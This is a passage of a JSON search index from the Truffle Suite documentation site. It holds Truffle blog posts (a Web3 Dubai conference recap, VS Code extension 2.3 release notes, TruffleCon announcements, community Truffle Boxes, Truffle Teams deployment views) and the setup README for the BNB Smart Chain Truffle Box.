about a single company being the major source of Ethereum node access. You can learn more about the announcement in this press release .", "title": "What\u2019s next for Truffle"}, {"location": "blog/we-came-we-saw-we-merged-whats-next-for-ethereum-and-the-dapp-developer-experience-at-truffle/#stay-in-touch-with-us", "text": "To stay up to date with the updates coming to Ethereum and how we are preparing for it at Truffle, subscribe to the Truffle newsletter by visiting our website today. We also hold weekly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Stay in touch with us"}, {"location": "blog/web3-dubai-my-first-web3-conference/", "text": "By Kingsley Arinze I\u2019ve been active in the web3 space for a little over a year now, with about 11 months of professional experience as a technical content writer and blockchain engineer. Despite that, I had never attended any web3 conference before Web3 Dubai. During one of my one-on-ones with my manager Clarissa Watson a couple of months ago, she found this surprising and made it one of my OKRs for the year to attend a web3 conference IRL. I was excited and happy, but honestly, I didn\u2019t know if I\u2019d be able to make it seeing that I recently moved to Dubai and getting an EU or US visa - as most web3 conferences happen in these regions - can be challenging, and 2022 is winding down fast. You can imagine my excitement when my teammate Megan Dias reached out to me about a web3 conference in Dubai. Megan had been helpful with tips about settling in Dubai since she\u2019d spent some time there visiting family. She was attending the conference so it would be a good opportunity to meet for the first time. It was a no-brainer! I reached out to Eric Bishard who happened to be one of the organizers and he offered me one of the remaining team tickets. Preaching the gospel of MetaMask Snaps, aka booth duty \u00b6 I spent some time at the booth, where I got to speak to people about MetaMask Snaps and all the opportunities it opens up for developers. If you're unfamiliar with MetaMask Snaps, it is the first of many features to be released by MetaMask Flask . Snaps allow users to safely expand the capabilities of MetaMask by adding new APIs to MetaMask, adding support for different blockchain protocols, including layer 2s, or modifying existing functionality using internal APIs. If you\u2019re interested in building with MetaMask Snaps when it goes public, you can check out this cool new MetaMask Snap Truffle box we\u2019ve built to help you get started quickly. You can learn more about MetaMask snaps and how to get started by checking out the Snaps documentation . Sharing updates on Truffle Suite \u00b6 I also seized the opportunity to talk to folks about Truffle and the work we\u2019re doing to help simplify the web3 development experience and onboard new developers to the web3 ecosystem. I introduced developers to one of my favorite Truffle features - a new way of deploying smart contracts without exposing their private keys using the Truffle Dashboard . I also showed them how this feature could be used in collaboration with other development environments like Hardhat. The developers I spoke to were excited to get back to using Truffle after I told them about Truffle\u2019s improved Typescript and Ethers.js support rolling out in the coming weeks. Truffle for VS Code extension and Programmatic Ganache were some other Truffle suite product offerings that were exciting to learn about. If you\u2019re curious how Truffle now measures up to Hardhat, you should check out this cool Truffle vs. Hardhat blog I wrote some weeks ago. Inspiring workshops, presentations, and talks \u00b6 I started off by attending Nader Dabit\u2019s workshop on LensProtocol and how to build on it and be a part of the Lens ecosystem. After that, I attended Mirko Garozzo\u2019s lightning talk on MetaMask Snaps that use non-EVM chains like Bitcoin, Solana, e.t.c. Manbir Singh also gave a lightning talk on the newly announced MetaMask grant DAO and how excited we at Consensys are about its possible outcome. Web3 Dubai was filled with so many great talks, and workshops that I couldn\u2019t attend all of them however, some interesting ones I either attended in person or watched a recap of on were by my awesome colleagues, and they include Jyoti Puri\u2019s technical talks on how MetaMask SDK works and how developers can leverage it, as well as all the platforms MetaMask SDK currently supports. Eric Bishard\u2019s workshop on building a dynamic NFT project using React and MetaMask SDK. He also did an introduction to Snaps talk as a bonus. Guillaume Bibeau-Laviolette\u2019s amazing talk on Web3 UX, including common mistakes developers make and how to fix them. Finally, Francesco Andreoli\u2019s talk on democratizing access to the decentralized web with MetaMask. There were a lot of other interesting talks I wasn\u2019t opportune to experience in person at the conference. However, I plan to watch a recap once they are available on Youtube in a digestible format. Dinner and networking \u00b6 Did I mention that the night before the conference, I attended the opening event for web3Dubai? It was held at Bla Bla Dubai, a cocktail bar by Jumeirah beach. The rest of the attendees and I had a lot to drink and eat. The first day of the conference was also Francesco Andreoli\u2019s birthday, so the team spent some time celebrating with him, although I couldn\u2019t join as I was a bit under the weather. Finally, the day after the conference Eric Bishard hit me up and made a reservation for me to meet with and network with some of the conference organizers and speakers later that evening. At ZouZou, JBR Jumeriah beach, I had some great conversations about web3 over good food and drinks. It was a great experience, I must say. Takeaways \u00b6 Since this was my first time attending a Web3 conference, I don\u2019t have any experience to measure this up to, so I genuinely think it was a great conference. I had great conversations and met with people I\u2019d never met in person for the first time, and I loved it. I also got to learn from all the sessions I attended. Having that many people gather under one roof, sharing knowledge, and learning about web3 together is an experience I want to have again. Maybe next year, Maybe next month, I guess we\u2019ll see! Either way, I\u2019m grateful to be part of this team and ecosystem.", "title": "Web3 Dubai - My first web3 conference"}, {"location": "blog/web3-dubai-my-first-web3-conference/#preaching-the-gospel-of-metamask-snaps-aka-booth-duty", "text": "I spent some time at the booth, where I got to speak to people about MetaMask Snaps and all the opportunities it opens up for developers. If you're unfamiliar with MetaMask Snaps, it is the first of many features to be released by MetaMask Flask . Snaps allow users to safely expand the capabilities of MetaMask by adding new APIs to MetaMask, adding support for different blockchain protocols, including layer 2s, or modifying existing functionality using internal APIs. If you\u2019re interested in building with MetaMask Snaps when it goes public, you can check out this cool new MetaMask Snap Truffle box we\u2019ve built to help you get started quickly. You can learn more about MetaMask snaps and how to get started by checking out the Snaps documentation .", "title": "Preaching the gospel of MetaMask Snaps, aka booth duty"}, {"location": "blog/web3-dubai-my-first-web3-conference/#sharing-updates-on-truffle-suite", "text": "I also seized the opportunity to talk to folks about Truffle and the work we\u2019re doing to help simplify the web3 development experience and onboard new developers to the web3 ecosystem. I introduced developers to one of my favorite Truffle features - a new way of deploying smart contracts without exposing their private keys using the Truffle Dashboard . I also showed them how this feature could be used in collaboration with other development environments like Hardhat. The developers I spoke to were excited to get back to using Truffle after I told them about Truffle\u2019s improved Typescript and Ethers.js support rolling out in the coming weeks. Truffle for VS Code extension and Programmatic Ganache were some other Truffle suite product offerings that were exciting to learn about. If you\u2019re curious how Truffle now measures up to Hardhat, you should check out this cool Truffle vs. Hardhat blog I wrote some weeks ago.", "title": "Sharing updates on Truffle Suite"}, {"location": "blog/web3-dubai-my-first-web3-conference/#inspiring-workshops-presentations-and-talks", "text": "I started off by attending Nader Dabit\u2019s workshop on LensProtocol and how to build on it and be a part of the Lens ecosystem. After that, I attended Mirko Garozzo\u2019s lightning talk on MetaMask Snaps that use non-EVM chains like Bitcoin, Solana, e.t.c. Manbir Singh also gave a lightning talk on the newly announced MetaMask grant DAO and how excited we at Consensys are about its possible outcome. Web3 Dubai was filled with so many great talks, and workshops that I couldn\u2019t attend all of them however, some interesting ones I either attended in person or watched a recap of on were by my awesome colleagues, and they include Jyoti Puri\u2019s technical talks on how MetaMask SDK works and how developers can leverage it, as well as all the platforms MetaMask SDK currently supports. Eric Bishard\u2019s workshop on building a dynamic NFT project using React and MetaMask SDK. He also did an introduction to Snaps talk as a bonus. Guillaume Bibeau-Laviolette\u2019s amazing talk on Web3 UX, including common mistakes developers make and how to fix them. Finally, Francesco Andreoli\u2019s talk on democratizing access to the decentralized web with MetaMask. There were a lot of other interesting talks I wasn\u2019t opportune to experience in person at the conference. However, I plan to watch a recap once they are available on Youtube in a digestible format.", "title": "Inspiring workshops, presentations, and talks"}, {"location": "blog/web3-dubai-my-first-web3-conference/#dinner-and-networking", "text": "Did I mention that the night before the conference, I attended the opening event for web3Dubai? It was held at Bla Bla Dubai, a cocktail bar by Jumeirah beach. The rest of the attendees and I had a lot to drink and eat. The first day of the conference was also Francesco Andreoli\u2019s birthday, so the team spent some time celebrating with him, although I couldn\u2019t join as I was a bit under the weather. Finally, the day after the conference Eric Bishard hit me up and made a reservation for me to meet with and network with some of the conference organizers and speakers later that evening. At ZouZou, JBR Jumeriah beach, I had some great conversations about web3 over good food and drinks. It was a great experience, I must say.", "title": "Dinner and networking"}, {"location": "blog/web3-dubai-my-first-web3-conference/#takeaways", "text": "Since this was my first time attending a Web3 conference, I don\u2019t have any experience to measure this up to, so I genuinely think it was a great conference. I had great conversations and met with people I\u2019d never met in person for the first time, and I loved it. I also got to learn from all the sessions I attended. Having that many people gather under one roof, sharing knowledge, and learning about web3 together is an experience I want to have again. Maybe next year, Maybe next month, I guess we\u2019ll see! Either way, I\u2019m grateful to be part of this team and ecosystem.", "title": "Takeaways"}, {"location": "blog/whats-new-on-the-truffle-for-vs-code-extension-version-2.3/", "text": "By Kingsley Arinze Earlier this year, we collaborated with Microsoft to release the Truffle for VS Code extension which allowed newbies and experienced web3 developers to code, debug, and deploy their smart contracts without needing to leave VS Code. This project which was originally started by Microsoft as the Blockchain Development Kit for Ethereum was transferred to the Truffle team for its maintenance through a partnership program . Since then, we\u2019ve seen some important integrations to existing developer resources and tools such as the integration of the Truffle debugger and Infura API. Today, we\u2019re excited to announce the release of the Truffle for VS Code version 2.3 , which in addition to bug fixes, introduces some new features that further improves the user experience for dapp developers. Features and bug fixes in Truffle for VS Code version 2.3 \u00b6 Here are some of the features and bug fixes you should be aware of in this new version: Feature: New Truffle tree view : This new version introduces a dedicated tree view on the right hand side of VS Code which gives extension users access to their contracts, deployments, and some helpful libraries and links. Prior to these versions, access to these features were only available through the main VS Code explorer (SHIFT + CMD + P) which meant that they weren't easily accessible. Since this feature is still being improved on, some points worth noting are: Not all of the features of the main explorer (SHIFT + CMD + P) are possible in the new explorer view. This new explorer view works on the basis of single repositories (not monorepos of multiple truffle projects) so we are going to be releasing fixes for that in the future. Feature: Ganache forked instance : With this new feature, you can now choose to fork a network of your choice when starting Ganache through the VS Code extension. Just like you can with the command line, you can choose a specific block or the latest block to fork from directly in VS Code. Feature: Support for Layer 1 and Layer 2 networks through Infura : Infura plans to update their service by offering a way to group our networks by Layer (i.e Layer 1 and Layer 2). This feature sets the foundation for supporting this feature in the Truffle for VS Code network views as seen in the image below. For now, we are waiting for the infura API release with the new response splitting networks into layer one and two. Bug fix: Build and deploy commands now work with mapping volumes on Windows 11 : This issue related to volume mapping was found on Windows 11 platforms where If a user opens a project in root (C:), the build and deploy commands both work fine. But, if the project is opened in a mapping volume, they get a spawn C:\\WINDOWS\\system32\\cmd.exe ENOENT error. A fix was made and applied for windows platforms only. Bug fix: No more double checks for required apps : The Truffle for VS Code extension relies on some third party services like Ganache , Infura , and Solidity plugin to function properly therefore it does a background check upon installing the extension to verify whether these services are set up correctly for the user. In previous versions, there are times when the required apps check can sometimes happen twice internally causing an error that says the user has not got all the required apps installed correctly. This new version introduces a fix. Conclusion \u00b6 Get started with the extension today by visiting the VS Code built-in marketplace and searching for \u201cTruffle for VS Code\u201d, or downloading it directly from the VS Code online marketplace . We appreciate any feedback you might have concerning the extension, so start a thread on GitHub Discussions ! As always, follow us on Twitter @trufflesuite to get the latest on all things Truffle!", "title": "What\u2019s new on the Truffle for VS Code extension version 2.3"}, {"location": "blog/whats-new-on-the-truffle-for-vs-code-extension-version-2.3/#features-and-bug-fixes-in-truffle-for-vs-code-version-23", "text": "Here are some of the features and bug fixes you should be aware of in this new version: Feature: New Truffle tree view : This new version introduces a dedicated tree view on the right hand side of VS Code which gives extension users access to their contracts, deployments, and some helpful libraries and links. Prior to these versions, access to these features were only available through the main VS Code explorer (SHIFT + CMD + P) which meant that they weren't easily accessible. Since this feature is still being improved on, some points worth noting are: Not all of the features of the main explorer (SHIFT + CMD + P) are possible in the new explorer view. This new explorer view works on the basis of single repositories (not monorepos of multiple truffle projects) so we are going to be releasing fixes for that in the future. Feature: Ganache forked instance : With this new feature, you can now choose to fork a network of your choice when starting Ganache through the VS Code extension. Just like you can with the command line, you can choose a specific block or the latest block to fork from directly in VS Code. Feature: Support for Layer 1 and Layer 2 networks through Infura : Infura plans to update their service by offering a way to group our networks by Layer (i.e Layer 1 and Layer 2). This feature sets the foundation for supporting this feature in the Truffle for VS Code network views as seen in the image below. For now, we are waiting for the infura API release with the new response splitting networks into layer one and two. Bug fix: Build and deploy commands now work with mapping volumes on Windows 11 : This issue related to volume mapping was found on Windows 11 platforms where If a user opens a project in root (C:), the build and deploy commands both work fine. But, if the project is opened in a mapping volume, they get a spawn C:\\WINDOWS\\system32\\cmd.exe ENOENT error. A fix was made and applied for windows platforms only. Bug fix: No more double checks for required apps : The Truffle for VS Code extension relies on some third party services like Ganache , Infura , and Solidity plugin to function properly therefore it does a background check upon installing the extension to verify whether these services are set up correctly for the user. In previous versions, there are times when the required apps check can sometimes happen twice internally causing an error that says the user has not got all the required apps installed correctly. This new version introduces a fix.", "title": "Features and bug fixes in Truffle for VS Code version 2.3"}, {"location": "blog/whats-new-on-the-truffle-for-vs-code-extension-version-2.3/#conclusion", "text": "Get started with the extension today by visiting the VS Code built-in marketplace and searching for \u201cTruffle for VS Code\u201d, or downloading it directly from the VS Code online marketplace . We appreciate any feedback you might have concerning the extension, so start a thread on GitHub Discussions ! As always, follow us on Twitter @trufflesuite to get the latest on all things Truffle!", "title": "Conclusion"}, {"location": "blog/why-i-love-trufflecon/", "text": "By Josh Quintal, Head of Product & Marketing The blockchain space is hitting a plateau. It\u2019s not a bad thing: new technologies encounter a series of plateaus and this one's no different. It\u2019s a good time to reflect and mature the ecosystem without the noise brought by rapid growth. We're in a crucible period not seen since the tech boom of the 90s. The early adopters are all here forging the blockchain-enabled world, readying for the next influx of users and companies. Remember when your friends and family raised eyebrows about this chainblock (or whatever) or thought Bitcoin was some kind of scam? Isn't that used to buy drugs? \ud83d\ude33 Now blockchain technology is becoming more efficient, more ubiquitous, and more accessible with each passing day. Now we hear things like \"blockchain is the future\" coming from outside our community. Almost two years ago when Truffle reached 4 people and that future seemed less sure, we were on our second retreat at a little place in Yakima. We mused about putting on a blockchain developer conference. Would people actually go? Who's going to speak? Can we get enough content? A few months later we decided to give it a try. Wow, people showed up--and not just that--they loved it! So many great conversations, so much valuable knowledge! Talks about smart contract upgrades, novel uses of merkle proofs, and data storage with IPFS just to name a few. A quietly skeptical Dave Burela (Blockchain Dev, MSFT and TruffleCon 2018 speaker) noted afterwards \"You actually pulled it off\". \ud83d\ude42 This year we have over 60 speakers across 60 sessions including: Thomas Hodges on Decentralized Oracles: Reliably Triggering Smart Contracts using Decentralized Computation using Truffle, Alejandro Banzas on RSK Integration with Ganache, and Greg Kapka on Developing Data-Rich Smart Contracts via Provable (Oraclize 2.0). TruffleCon is a conference, sure, but it's more than that: it's the feeling of excitement when learning a new technology; the eureka we felt when first discovering this new frontier. It's connections made in minutes that can last a lifetime. It's the culmination of everything we've worked for since the founding of this company. I hope to not only see you there but to have a chat about what we do well and how we can improve (you'll also get a hat). Together we're building the community that will take us from this plateau onward to the next meteoric growth spurt. Sincerely, Josh Quintal", "title": "Why I love TruffleCon"}, {"location": "blog/why-were-organizing-trufflecon-2018/", "text": "As you have hopefully heard by now, TruffleCon , Truffle's first-ever user conference, will be on October 5-7, 2018 in Portland, Oregon, U.S.A . Buy Tickets! Why TruffleCon? \u00b6 There is certainly no shortage of conferences related to Ethereum. Ethereal recently wrapped up in New York City, and Devcon4 is ramping up in Prague later on this year. There's also EDCON , EthCC , and plenty more, especially when you count those that intersect with the larger blockchain space. And yet, these events usually have a focus on the larger ecosystem. What about the people who are deep in the trenches, building the dapps and deploying the contracts? We want TruffleCon to be the place for people who are doing the building. Also, many developers are working in silos, connected to other teams only by GitHub, StackExchange, Reddit, or other \" weak ties \". We want to strengthen those connections to bring people together . We want people to share their ideas, and talk about their successes and challenges. We want people to promote their projects, of course, and professional networking is always a part of these events, but more than anything else, we want people to be heard . Why now? \u00b6 We've noticed a shift over the past year or so in the usage of Truffle. Whereas many of the comments and requests in our GitHub channel and GitHub issues were originally regarding local tests, and in sandboxes, we noticed more and more people deploying their contracts to the public test networks and even the mainnet. While this, of course, was always the intention, it shows that confidence in our tools and the Ethereum ecosystem is growing . We want to help people \"go live\". And so we believe that there has never been a better time than now. Why Portland? \u00b6 Portland is a vibrant city full of world-class food and drink, unmatched outdoor opportunities, and an excellent transportation system for getting where you need to go. And early October is typically a sweet spot where the days are still warm and dry, while the fall colors are starting to come into view. If you've never been, you're missing out. And why not stay awhile once you're here? Photo courtesy of Flickr/sama093. Large version here . See you in October! \u00b6 From Truffle founder Tim Coulter: \"The best conference we could put on is one where there's a ton of active engagement. I want people to feel like they are surrounded by other people who can help them. And I want them to leave feeling like they learned something and that the Truffle community is better off because they were there. If we do it right, people will go home inspired, and will change how they do their development.\" We can't wait to see you there. If you have questions, feel free to tweet us at @trufflesuite . And please use the hashtag #TruffleCon . Buy Tickets! Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. Mike is also the lead organizer for TruffleCon 2018.", "title": "Why We're Organizing TruffleCon 2018"}, {"location": "blog/why-were-organizing-trufflecon-2018/#why-trufflecon", "text": "There is certainly no shortage of conferences related to Ethereum. Ethereal recently wrapped up in New York City, and Devcon4 is ramping up in Prague later on this year. There's also EDCON , EthCC , and plenty more, especially when you count those that intersect with the larger blockchain space. And yet, these events usually have a focus on the larger ecosystem. What about the people who are deep in the trenches, building the dapps and deploying the contracts? We want TruffleCon to be the place for people who are doing the building. Also, many developers are working in silos, connected to other teams only by GitHub, StackExchange, Reddit, or other \" weak ties \". We want to strengthen those connections to bring people together . We want people to share their ideas, and talk about their successes and challenges. We want people to promote their projects, of course, and professional networking is always a part of these events, but more than anything else, we want people to be heard .", "title": "Why TruffleCon?"}, {"location": "blog/why-were-organizing-trufflecon-2018/#why-now", "text": "We've noticed a shift over the past year or so in the usage of Truffle. Whereas many of the comments and requests in our GitHub channel and GitHub issues were originally regarding local tests, and in sandboxes, we noticed more and more people deploying their contracts to the public test networks and even the mainnet. While this, of course, was always the intention, it shows that confidence in our tools and the Ethereum ecosystem is growing . We want to help people \"go live\". And so we believe that there has never been a better time than now.", "title": "Why now?"}, {"location": "blog/why-were-organizing-trufflecon-2018/#why-portland", "text": "Portland is a vibrant city full of world-class food and drink, unmatched outdoor opportunities, and an excellent transportation system for getting where you need to go. And early October is typically a sweet spot where the days are still warm and dry, while the fall colors are starting to come into view. If you've never been, you're missing out. And why not stay awhile once you're here? Photo courtesy of Flickr/sama093. Large version here .", "title": "Why Portland?"}, {"location": "blog/why-were-organizing-trufflecon-2018/#see-you-in-october", "text": "From Truffle founder Tim Coulter: \"The best conference we could put on is one where there's a ton of active engagement. I want people to feel like they are surrounded by other people who can help them. And I want them to leave feeling like they learned something and that the Truffle community is better off because they were there. If we do it right, people will go home inspired, and will change how they do their development.\" We can't wait to see you there. If you have questions, feel free to tweet us at @trufflesuite . And please use the hashtag #TruffleCon . Buy Tickets! Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. Mike is also the lead organizer for TruffleCon 2018.", "title": "See you in October!"}, {"location": "blog/you-can-now-make-your-own-truffle-box/", "text": "Two months ago we unveiled official integration with Truffle Boxes , example Ethereum applications and/or boilerplates that put complimentary tools and libraries into sweet, easily-downloadable packages. In addition to rolling out some official boxes, Status.im released the first community-supported box . Today we're happy to announce anyone can now make their very own Truffle Box! Making a Box \u00b6 To get started making a box, we've added a page to our documentation . For those starting a new box from scratch, we've also created a blueprint Truffle Box to get you started quickly. The First Wave \u00b6 We included a call for pre-screening in the community section of our first box rollout and some trailblazers answered the call! Here are the first community boxes: Quintor/angular-truffle-box This Truffle Box provides a base for working with the Truffle Suite and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI. hackingbeauty/react-dapp-material-ui In addition to Webpack and React, this box adds: React-Router, Redux and Material-UI for easy skinning of a Dapp. antony/svelte-box A Truffle box using SvelteJS and Rollup. This box contains everything you need to start building a smart-contract app. kierenh/vue-dark-chocolate A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex, Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack. The sample uses webpack-dev-server for hot-reloading or you can build and serve from express. Check out the full list of boxes here . A huge thank you to our entire community! We're humbled by your dedication and excited to see what's in store for the future. -- Josh & the Truffle Team", "title": "You Can Now Make Your Own Truffle Box"}, {"location": "blog/you-can-now-make-your-own-truffle-box/#making-a-box", "text": "To get started making a box, we've added a page to our documentation . For those starting a new box from scratch, we've also created a blueprint Truffle Box to get you started quickly.", "title": "Making a Box"}, {"location": "blog/you-can-now-make-your-own-truffle-box/#the-first-wave", "text": "We included a call for pre-screening in the community section of our first box rollout and some trailblazers answered the call! Here are the first community boxes: Quintor/angular-truffle-box This Truffle Box provides a base for working with the Truffle Suite and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI. hackingbeauty/react-dapp-material-ui In addition to Webpack and React, this box adds: React-Router, Redux and Material-UI for easy skinning of a Dapp. antony/svelte-box A Truffle box using SvelteJS and Rollup. This box contains everything you need to start building a smart-contract app. kierenh/vue-dark-chocolate A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex, Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack. The sample uses webpack-dev-server for hot-reloading or you can build and serve from express. Check out the full list of boxes here . A huge thank you to our entire community! We're humbled by your dedication and excited to see what's in store for the future. -- Josh & the Truffle Team", "title": "The First Wave"}, {"location": "blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/", "text": "With Truffle Teams, you can manage multiple deployed instances of your smart contracts across different networks. We\u2019ve heard mixed feedback about this workflow and are updating it accordingly: adding a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. What\u2019s New with Deployments? \u00b6 Our first iteration of Visual Deployments revolved around a pipeline view, with your commits on the left hand side and a production network on the right. While some do use and appreciate this type of workflow, many have only a single production instance, and having an entire column just for this doesn\u2019t make sense for those use cases. With that in mind, we\u2019re offering a new table view, so you can see all of your deployed instances even more quickly and in an uncluttered way. In the future, you\u2019ll also be able to sort and filter this table for even easier access. The new deployments table view--you can still access the card view via the toggle switch in the upper-right. You\u2019ll also notice that clicking the name of a deployment now goes to a new deployment details screen. This contains the current status of the deployment along with its console output (an oft-requested addition)! The deployment details screen. Notice you can now access the console output! For more information on the new deployments screen, check out the Truffle Teams Deployments docs . CHECK OUT THE DEPLOYMENTS MANAGER Thoughts? \u00b6 We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Head of Product & Marketing", "title": "You Decide - Pipeline or Table View in Truffle Teams' Refreshed Deployments Manager"}, {"location": "blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/#whats-new-with-deployments", "text": "Our first iteration of Visual Deployments revolved around a pipeline view, with your commits on the left hand side and a production network on the right. While some do use and appreciate this type of workflow, many have only a single production instance, and having an entire column just for this doesn\u2019t make sense for those use cases. With that in mind, we\u2019re offering a new table view, so you can see all of your deployed instances even more quickly and in an uncluttered way. In the future, you\u2019ll also be able to sort and filter this table for even easier access. The new deployments table view--you can still access the card view via the toggle switch in the upper-right. You\u2019ll also notice that clicking the name of a deployment now goes to a new deployment details screen. This contains the current status of the deployment along with its console output (an oft-requested addition)! The deployment details screen. Notice you can now access the console output! For more information on the new deployments screen, check out the Truffle Teams Deployments docs . CHECK OUT THE DEPLOYMENTS MANAGER", "title": "What\u2019s New with Deployments?"}, {"location": "blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/#thoughts", "text": "We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Head of Product & Marketing", "title": "Thoughts?"}, {"location": "boxes/", "text": "", "title": "Truffle Boxes"}, {"location": "boxes/BSC-Truffle-Starter-Box/", "text": "BNB Smart Chain Truffle Box \u00b6 BNB Smart Chain Truffle Box Requirements Installation Setup Using the env File New Configuration File New Directory Structure for Artifacts BNB Smart Chain Compiling Migrating Paying for Migrations Basic Commands Testing Support Table of contents generated with markdown-toc This Truffle BNB Smart Chain box provides you with the boilerplate structure necessary to start coding on the BNB Smart Chain. For detailed information on how the BNB Smart Chain works, please see their documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on BNB Smart Chain without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of BNB Smart Chain networks. The BNB Smart Chain is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the BNB Smart Chain network. Requirements \u00b6 The BSC box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: A MetaMask account Installation \u00b6 truffle unbox bnb-chain/BSC-Truffle-Starter-Box Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.bsc.js file expects a MNEMONIC value to exist in .env for running migrations on the networks listed in truffle-config.bsc.js . If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own mnemonic: MNEMONIC=\"<Your Mnemonic>\" As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.bsc.js . This file contains a reference to the new file location of the contracts_build_directory for BNB Smart Chain contracts and lists several networks that are running the BNB Smart Chain network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to on localhost for local development. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/local-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/local-dev folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/bsc-contracts/ . This is to distinguish them from contracts you build for any other network other than BSC. As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! BNB Smart Chain \u00b6 Compiling \u00b6 You do not need to add any new compilers or settings to compile your contracts for the BNB Smart Chain, as it is fully EVM compatible. The truffle-config.bsc.js configuration file indicates the contract and build paths for BSC-destined contracts. If you are compiling contracts specifically for the BNB Smart Chain network, use the following command, which indicates the appropriate configuration file: npm run compile:bsc If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config=truffle-config.bsc.js and add the --all flag. Migrating \u00b6 To migrate on the BNB Smart Chain network, run npm run migrate:bsc --network=(bscTestnet | bscMainnet) (remember to choose a network from these options!). As you can see, you have two BSC networks to choose from: bscTestnet : This is the BNB Smart Chain testnet. bscMainnet : This is the BNB Smart Chain mainnet. Caution! If you deploy to this network using a connected wallet, the fees are charged in mainnet BNB. If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.bsc.js --network= (bscTestnet | bscMainnet) and add the --reset flag. Paying for Migrations \u00b6 To pay for your deployments, you will need to have an account with BNB available to spend. You will need your mnemomic phrase (saved in the .env file or through some other secure method). The first account generated by the seed needs to have the BNB you need to deploy. If you do not have a wallet with funds to deploy, you will need to connect a wallet to at least one of the networks above. For testing, this means you will want to connect a wallet to the BSC Testnet network. We recommend using MetaMask . Documentation for how to set up MetaMask to configure custom network like BSc Testnet can be found here . Follow the steps in the documentation above using the BNB Smart Chain RPC endpoints ( https://docs.bnbchain.org/docs/rpc ). The chainId values are the same as those in the truffle-config.bsc.js networks entries. To get testnet BNB tokens use the official faucet . Basic Commands \u00b6 The code here will allow you to compile, migrate, and test your code on the BNB Smart Chain. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:bsc To migrate: npm run migrate:bsc --network=(bscTestnet | bscMainnet) To test: npm run test:bsc --network=(bscTestnet | bscMainnet) Testing \u00b6 In order to run the test currently in the boilerplate, use the following command: npm run test:bsc --network=(bscTestnet | bscMainnet) (remember to choose a network!). The current test file just has some boilerplate tests to get you started. You will likely want to add network-specific tests to ensure your contracts are behaving as expected. Support \u00b6 Support for this box is available via the Truffle community here or on our official Discord Channel .", "title": "BNB Smart Chain Truffle Box"}, {"location": "boxes/BSC-Truffle-Starter-Box/#bnb-smart-chain-truffle-box", "text": "BNB Smart Chain Truffle Box Requirements Installation Setup Using the env File New Configuration File New Directory Structure for Artifacts BNB Smart Chain Compiling Migrating Paying for Migrations Basic Commands Testing Support Table of contents generated with markdown-toc This Truffle BNB Smart Chain box provides you with the boilerplate structure necessary to start coding on the BNB Smart Chain. For detailed information on how the BNB Smart Chain works, please see their documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on BNB Smart Chain without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of BNB Smart Chain networks. The BNB Smart Chain is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the BNB Smart Chain network.", "title": "BNB Smart Chain Truffle Box"}, {"location": "boxes/BSC-Truffle-Starter-Box/#requirements", "text": "The BSC box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: A MetaMask account", "title": "Requirements"}, {"location": "boxes/BSC-Truffle-Starter-Box/#installation", "text": "truffle unbox bnb-chain/BSC-Truffle-Starter-Box", "title": "Installation"}, {"location": 